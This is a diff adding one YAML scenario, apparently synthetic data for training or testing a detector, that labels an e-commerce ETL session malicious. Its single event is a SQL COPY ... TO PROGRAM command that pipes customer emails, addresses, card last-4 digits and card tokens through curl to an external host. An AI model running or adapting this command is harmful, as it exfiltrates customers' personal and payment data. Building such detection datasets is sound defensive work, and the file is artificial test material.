@@ -1,0 +1,30 @@
+scenario_id: ecommerce_etl_exfil_mal_0002
+family_id: ecommerce_etl_pair_0002
+domain: ecommerce
+matched_pair_id: ecommerce_etl_pair_0002
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - role
+  varied:
+  - sql_content
+  - connects_to_destination
+time_of_day: 04:15
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: replication
+  role: analytics_etl_service
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 4.7623889536114685
+  events:
+  - step_id: replicate
+    sql: COPY (SELECT c.email, c.shipping_address, pay.card_last4, pay.card_token, pay.amount FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id)
+      TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'
+    connects_to:
+      ip: 91.219.236.174
+      port: 443
